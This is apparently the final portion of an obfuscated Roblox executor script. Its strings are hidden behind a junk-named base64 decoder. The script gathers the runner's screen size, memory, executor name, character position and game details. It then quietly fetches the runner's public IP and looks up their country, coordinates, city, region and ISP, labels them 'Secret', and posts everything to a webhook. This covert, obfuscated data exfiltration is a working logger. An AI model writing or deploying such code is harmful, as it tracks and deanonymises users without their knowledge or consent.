                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('IMwZJvOxqTBWVESByRGejeiiJEQsmVKRGgvmCdvaULMVgZQFFNEgaOzbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KPERiOhlgUFDuOHESUHLHNtcqlGOmXXQooDBKFuUwlbtvWrIThvAzeh8J+Wpe+4jyAqKlN5c3RlbSBJbmZvKio='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('aIjFOoOeVMRwwQSWNFOHysRmnnMRjJcSgQiPVWkHkjAsNqmAclkTSzJdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yTJpwvKtPcnClZevRjZHmHiyaDRiyixxTwWroejSxjdoXarOdnfiKkl8J+TuiBSZXNvbHV0aW9uOiA=') .. screenWidth .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EpeIiZGoTYioYViSBMtLzUCswdOjFQeZGowylPuCfJuZBiBWFqOLxsCeA==') .. screenHeight ..
                        yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('zcKxBBjErvHjzWskCJDjKZUfrMCYHBjltwLSrfQfgGIKswKLorXMlPtXG7wn5SNIE1lbW9yeSBVc2FnZTog') .. memoryUsage .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('xYbdpouTnEnUWSyIuESOvZmxMCZpaVjgIjzJMBwEHjqCwRCybyDaOrFIE1CXG7impnvuI8gRXhlY3V0b3I6IA==') .. identifyexecutor() .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('dcKjbhPPGowXKhPeIGyUAwgRJyBzmtOzWQcNrQYRUYIiJJtDDRlAJIHXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('HUDpxDTdHeEgnthVnzGQqwKxTTAhvdgHBZDQHZupZhLuKrSMnDsrJJOaW5saW5l')] = true
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('eQuNrnbpjVUYbFpDFJbLYjeEXXRbfTkkObyFxwCFLedoWQwIxehiTsubmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ZitZpgamXoMtTMQKCfSSiXUTMHwEORMtfaigptqPJVPOZkSIeuGmgKu8J+TjSAqKkNoYXJhY3RlciBQb3NpdGlvbioq'),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('nYTkPDHICcXdYpehdhuJvvBNsuzfkxjxGVSNqSJbuWMsyAHMJBHjfuodmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('cWiBLyRWCeHKExzgfHOfewVoJMQyvLRFiFHHAAausOMEjsBUdfjqdTl8J+TjSBQb3NpdGlvbjog') .. tostring(position) .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EUunjYdkwobbpCTopXUqnpbLwdMTWsZzaYNwlYRbxDYLUxlZMErBQSjXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('BXVAtRiMAsCbEddJzdmMknLSeAuhPatEeLIZIGtDzjNMDYsewNkWUyQaW5saW5l')] = true
                },
                {
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('BcCwUUXlFdSBQSIwKPzAndjPybpjAiaakBRhHXJtIMNDQtewRCmbJhzbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('yDoFedvIhhLvfMSQpAhfVVbmijNYUwdBXQdXxAoATCnjpauPXFFMDrD8J+qpyAqKkpvaW4gU2NyaXB0Kio='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EvfdtRGiwJTRbSbsUVrTLladAkxJyVXrcdLhqWkZHMTsuRIwQpKVrlxdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('zFQgMcXPqOcDDHKGGInqSYMDRXBbCOEEHjYCAEVLNUjkyfyZMwrfrZObHVhXG4=') .. snipePlay .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('vBfEBEfwwGWLfjDLprxbRujpFTcYzmKKLlXFjWYDlOvgZBmldJxgZjuXG4='),
                    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oOsYPjTUJNDdIbCGoOwsJQbNBUoKFxAZSETmBcGllaxndHjpXEFHJDDaW5saW5l')] = false
                }
            },
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KWYxHviJbHXHlxGWrSvuecWTriTXRCjqQCTQIiPpFdhSceestwRwdRrdGh1bWJuYWls')] = {
                [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('VsEHtrSTKyQhQrDREkycXYTSqiYVvDGiqDDwUuLWflYvyfVZIjhzFiCdXJs')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('LaPuAQCsSQnQBDbLTeCOfkymSBlrDXmkHTBMiVTttJOIAPqiFANHZvOaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vaWNvbnMvODc0NTg3MDgzMjkxODg1NjA4L2FfODAzNzM1MjQ1ODZhYWI5MDc2NWY0YjFlODMzZmRmNWEuZ2lmP3NpemU9NTEy')
            },
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('qpJyJtGTJAgdbaTnIZYTfEwrMTAdTtlKZnFaLcNdNNZrTwIKpxAqNQoZm9vdGVy')] = {
                [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('BrWovvyEWTXzQZGWatqJtSfTEnUAgroIXdeFREkrqLNxmbDVOFLiCsrdGV4dA==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('bNGgrgLjWMTKkusJIEupzJKNBIEzKODRHqFlspYnehVEjBqAbjOEOcpRXhlY3V0aW9uIExvZyB8IA==') .. os.date(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('BgJcYayXsySgHqXHaclvbYkBETJSNKIAsRiVzMhUPlqNpefHyYOcGFnJVktJW0tJWQgJUg6JU06JVM=')),
                [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('GmolLiZIUsbOSjcdzedgFEtQkTncYNgAFgjZOUOSKlSBUArpfqtVwouaWNvbl91cmw=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oNbwcZJbGXFulgqZXXUKDLgNSNiTizahoyMJAEUgEFGFZkYGmaTqfVaaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vaWNvbnMvODc0NTg3MDgzMjkxODg1NjA4L2FfODAzNzM1MjQ1ODZhYWI5MDc2NWY0YjFlODMzZmRmNWEuZ2lmP3NpemU9NTEy')
            }
        }
    }
}

if ExecLogSecret then
    local ip = game:HttpGet(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('AWpHOGFksOinsQuUnbbhloVqTIudYyravMapTBrnKJDeEgltMyEhArgaHR0cHM6Ly9hcGkuaXBpZnkub3Jn'))
    local iplink = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('nAOfeqwpnLHcqfmuWbdoChyZmRqiPANUlXbKOwtFiYWmPvqYsopSFCzaHR0cHM6Ly9pcGluZm8uaW8v') .. ip .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('YozbSCmcwSBlXceDajGxtsWUpsJkkyRIMCsBSwdujtaSUlkNisETeQnL2pzb24=')
    local ipinfo_json = game:HttpGet(iplink)
    local ipinfo_table = game.HttpService:JSONDecode(ipinfo_json)

    table.insert(
        data.embeds[1].fields,
        {
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('cSBpfYnEDqogchbgliyMCGkYmZYpyRpoispFmVqvgrYfkPFFdJaIDWAbmFtZQ==')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('mEZDVGjThEKHsbUrStccaFauVtoLMLLJSLxPTIFtWmPsRYDiYhUgZiVKioo8J+kqykgU2VjcmV0Kio='),
            [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('EGTMCQVALvBhIOIqrKqAmjqjcbkRVRENujuWiKDzpurcoxQBzYenpFxdmFsdWU=')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('wWVfZCfDjymvAUAsPpdyXksHDkuduCGDaooDgioobaRHUIGpXcKOrgwfHwo8J+RoykgSVAgQWRkcmVzczog') .. ipinfo_table.ip ..
                yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('jiDuHDyBCFVZToFrFyxUDdBivCTQuMxnfgxNNYAeMBCVgijBePYIJnBfHxcbnx8KPCfjIYpIENvdW50cnk6IA==') .. ipinfo_table.country ..
                yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('epDEsrPDZjOZZPVfHoOMiZLQeFbxsZSKIXAidgWPQBjfPeXxrlOiAEGfHxcbnx8KPCfqp8pIEdQUyBMb2NhdGlvbjog') .. ipinfo_table.loc ..
                yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('LMBczgDINFGoStYNKtYahVBRtybpcfZienddEARwxcIENfdTzxqZgOofHxcbnx8KPCfj5nvuI8pIENpdHk6IA==') .. ipinfo_table.city ..
                yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KZKjyBRENWhBPtiJAmmSAvJsnJIYnVpMSXlrVSdHCiynASnTDHINweQfHxcbnx8KPCfj6EpIFJlZ2lvbjog') .. ipinfo_table.region ..
                yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('RDFVoLymTpPNUrMyjLKhYNexIcyXxLqpeGDbaBRsDUEFSwaYqWqpPdXfHxcbnx8KPCfqqIpIEhvc3Rlcjog') .. ipinfo_table.org .. yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('CkcCCezGXkBIdrTDdqtEvSBtcXdtuokZKIuThtYbkDXkosYksuVoHggfHw=')
        }
    )
end

local newdata = game:GetService(yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('ZzZKgaqvXhaPQNuLATdSWAMUmQaJZSshCgPElIVHFkaQpAQIGsChYXjSHR0cFNlcnZpY2U=')):JSONEncode(data)
local headers = {
    [yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('oiywjKxuXSqRHcerdgkXqvFdgKkgjExUCyFOHiagNAHGzzwFhNMATSFY29udGVudC10eXBl')] = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('KPwmAddXtrDMcgqgaHNTElAnwjrpXtkYXUdsIwKGnOWQOYHLbbWtbQrYXBwbGljYXRpb24vanNvbg==')
}
request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
local abcdef = {Url = url, Body = newdata, Method = yetTExYGYIRCsfTYqHXhwEkVTdTdsLBCuStMYrPZxVUhWSXRhGmSNYDiMLwaQvMhvYJOkkZy('rPurzkVuamUgXhtAGspVrmFSXtqwLDAphdMBCgpsbBclRHBlbCeEcJFUE9TVA=='), Headers = headers}
request(abcdef)
    
